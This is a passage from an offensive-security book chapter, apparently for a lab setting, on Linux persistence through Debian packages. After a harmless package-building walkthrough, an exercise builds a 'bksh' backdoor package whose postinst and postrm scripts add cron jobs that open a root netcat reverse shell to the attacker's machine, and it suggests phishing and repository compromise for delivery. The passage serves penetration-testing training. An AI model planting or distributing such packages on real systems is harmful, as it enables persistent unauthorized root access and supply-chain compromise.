<h3 class="H2" id="sec15"><span id="h2-155"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Packaging Innocent Software</span></h3>&#13;
<p class="TNI1">Let’s practice creating packages by making our own innocent package. On your Kali machine, create a directory named <i>example</i>:</p>&#13;
<pre><code>$ <b>mkdir /tmp/example &amp;&amp; cd /tmp/example</b></code></pre>&#13;
<p class="TX">Next, create a directory named <i>DEBIAN</i> inside the <i>example</i> directory:</p>&#13;
<pre><code>$ <b>mkdir DEBIAN</b></code></pre>&#13;
<p class="TX">Create a file named <i>control</i> inside the <i>DEBIAN</i> directory, with the following package metadata, and save the file:</p>&#13;
<pre><code>Package: example&#13;
Version: 1.0.0&#13;
Maintainer: Your Name&#13;
Description: Example&#13;
Homepage: https://nostarch.com&#13;
Architecture: all&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_254" aria-label="254"/>Then use <span class="SANS_TheSansMonoCd_W7Bold_B_11">dpkg -b</span> (build) to build the package. The first argument to <span class="SANS_TheSansMonoCd_W5Regular_11">-b</span> is the name of the directory where the files to package are located, followed by the name of the artifact to generate:</p>&#13;
<pre><code>$ <b>dpkg -b example example_amd64.deb</b>&#13;
$ <b>ls -l</b>&#13;
&#13;
drwxr-xr-x 3 kali kali 4096 Sep 17 20:33 example&#13;
-rw-r--r-- 1 kali kali  684 Sep 17 21:22 example_amd64.deb&#13;
</code></pre>&#13;
<p class="TX">We can install this package by using <span class="SANS_TheSansMonoCd_W5Regular_11">sudo dpkg -i</span> <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">package</span> and remove it by using <span class="SANS_TheSansMonoCd_W5Regular_11">sudo dpkg -r</span> <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">package</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec16">&#13;
<h3 class="H2" id="sec16"><span id="h2-156"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Converting Package Formats with alien</span></h3>&#13;
<p class="TNI1">Other Linux distributions use different package formats. Luckily, we can convert packages from one format to another (for example, from RPM to DEB or from DEB to RPM) by using a tool called <span class="SANS_TheSansMonoCd_W5Regular_11">alien</span>. Kali should come with <span class="SANS_TheSansMonoCd_W5Regular_11">alien</span> installed, but if not, install it using <span class="SANS_TheSansMonoCd_W7Bold_B_11">sudo apt install alien</span>.</p>&#13;
<p class="TX">The following example converts a DEB package to an RPM package:</p>&#13;
<pre><code>$ <b>sudo alien -v -r bksh_amd64.deb --scripts</b>&#13;
&#13;
  dpkg-deb --info 'bksh_amd64.deb' control 2&gt;/dev/null&#13;
<var>--snip--</var>&#13;
  dpkg-deb --info 'bksh_amd64.deb' preinst 2&gt;/dev/null&#13;
  dpkg-deb --info 'bksh_amd64.deb' prerm 2&gt;/dev/null&#13;
  mkdir bksh-1.0.0&#13;
  chmod 755 bksh-1.0.0&#13;
<var>--snip--</var>&#13;
bksh-1.0.0-2.noarch.rpm generated&#13;
</code></pre>&#13;
<p class="TX">We use the arguments <span class="SANS_TheSansMonoCd_W5Regular_11">-v</span> (verbose), <span class="SANS_TheSansMonoCd_W5Regular_11">-r</span> <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">package</span> (where the <i>r</i> stands for <i>rpm conversion</i>), and <span class="SANS_TheSansMonoCd_W5Regular_11">--scripts</span> to tell <span class="SANS_TheSansMonoCd_W5Regular_11">alien</span> to use verbose output, convert the package to RPM, and include the post- and pre-scripts we created earlier.</p>&#13;
<p class="TX">Converting a package from RPM back to the DEB format is as easy as changing the <span class="SANS_TheSansMonoCd_W5Regular_11">-r</span> flag to <span class="SANS_TheSansMonoCd_W5Regular_11">-d</span>.</p>&#13;
<p class="HeadAExercise"><span id="exe-22"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 22: Writing a Malicious Package Installer</span></p>&#13;
<p class="TNI1">We could create a malicious package installer to gain persistence on a system in a few ways:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">By compromising a central software repository, such as a local APT repository</li>&#13;
<li class="ListBullet">By compromising an account that has permissions to install packages</li>&#13;
<li class="ListBullet">By sending a malicious package as part of a phishing campaign against system administrators</li>&#13;
</ul>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_255" aria-label="255"/>The APT repository mentioned in the first scenario is a web server that contains a database of DEB packages. Consumers on the network, such as servers or end users, can use the APT repository to download packages onto their operating system and install them. You’ll find such setups in networks that aren’t directly connected to the internet or that are designed to install software from trusted sources only.</p>&#13;
<p class="TX">Let’s create a DEB package containing malicious scripts for use in one of these scenarios. Specifically, we’ll use the <i>postinst</i> and <i>postrm</i> scripts to deploy and persist a reverse shell. Call your package <i>bksh</i>, for <i>backdoor shell</i>, and create a <i>control</i> file, as discussed in <span class="Xref">“Packaging Innocent Software” on <a href="#pg_253">page 253</a></span>. Next, create <i>postinst</i> and <i>postrm</i> files in the <i>DEBIAN</i> directory and set their permissions:</p>&#13;
<pre><code>$ <b>touch postinst postrm</b>&#13;
$ <b>chmod 775 postinst postrm</b>&#13;
</code></pre>&#13;
<p class="TX">Your directory structure should look like this:</p>&#13;
<pre><code>$ <b>tree bksh</b>&#13;
&#13;
bksh&#13;
<span class="SANS_Courier_Std_Medium_11">└──</span> DEBIAN&#13;
     <span class="SANS_Courier_Std_Medium_11">├──</span> control&#13;
     <span class="SANS_Courier_Std_Medium_11">├──</span> postinst&#13;
     <span class="SANS_Courier_Std_Medium_11">└──</span> postrm&#13;
&#13;
2 directories, 3 files&#13;
</code></pre>&#13;
<p class="TX">Populate the <i>postinst</i> script with a bash script that calls the reverse shell. For example, the script in <a href="chapter10.xhtml#Lis10-9">Listing 10-9</a> will reach out to the Kali machine by using the system-wide crontab file <i>/etc/crontab</i>:</p>&#13;
<span id="Lis10-9"/><pre><code>#!/bin/bash&#13;
&#13;
if ! grep -q "4444" /etc/crontab; then&#13;
  echo "* * * * * root nc 172.16.10.1 4444 -e /bin/bash" &gt;&gt; /etc/crontab&#13;
fi&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-9: A reverse shell callback using</span> <span class="SANS_Futura_Std_Book_11">/etc/crontab</span></p>&#13;
<p class="TX">When a user first installs the package, an entry will be written into <i>/etc/crontab</i>. That user could be the root user, or any other user that can install packages by using a tool such as <span class="SANS_TheSansMonoCd_W5Regular_11">dpkg</span>. To ensure that we write this entry only once, we use <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span> to check whether the string <span class="SANS_TheSansMonoCd_W5Regular_11">4444</span> exists in the file before proceeding with the actual modification.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_256" aria-label="256"/>Next, populate the <i>postrm</i> script with another reverse shell. This time, the cron job will belong to the user that executes the package removal and won’t be system-wide:</p>&#13;
<pre><code>#!/bin/bash&#13;
&#13;
if ! grep -q "4444" /var/spool/cron/crontabs/root 2&gt; /dev/null; then&#13;
  echo "* * * * * nc 172.16.10.1 4444 -e /bin/bash" | crontab - -u root&#13;
fi&#13;
</code></pre>&#13;
<p class="TX">This second script provides a fallback mechanism in cases when this package is removed from the system.</p>&#13;
<p class="TX">You can develop additional fallback persistence mechanisms as an extension to the exercise. For example, try writing a small web shell to a file on the system if the system shows signs of running web server processes to common web directories, such as <i>/var/www/html</i>.</p>&#13;
<p class="TX">To test the package, build it, then start a Netcat reverse shell on your Kali machine. Copy the package to one of the lab machines, such as <i>p-jumpbox-01</i> (172.16.10.13), and install it by using the <i>root</i> user:</p>&#13;
<pre><code># <b>dpkg -i bksh_amd64.deb</b></code></pre>&#13;
<p class="TX">Then verify that you can see the reverse shell cron job in <i>/etc/crontab</i>:</p>&#13;
<pre><code>$ <b>grep 4444 /etc/crontab</b></code></pre>&#13;
<p class="TX">After about a minute, you should see the reverse shell connection to your Kali Netcat listener. To test <i>postrm</i>, remove the package from <i>p-jumpbox-01</i>, then check the <i>root</i> user’s crontab.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec17">&#13;
<h2 class="H1" id="sec17"><span id="h1-92"/><span class="SANS_Futura_Std_Bold_B_11">Summary</span></h2>&#13;
<p class="TNI1">In this chapter, you learned many ways of using bash to persist your access in the post-compromise stage. We introduced malicious logic to PAM modules, system profiles, text editors, and fake utilities. We also enabled dormant accounts and added rogue SSH keys, then packaged malicious software using the DEB format.</p>&#13;
</section>&#13;
</section>&#13;
</body></html>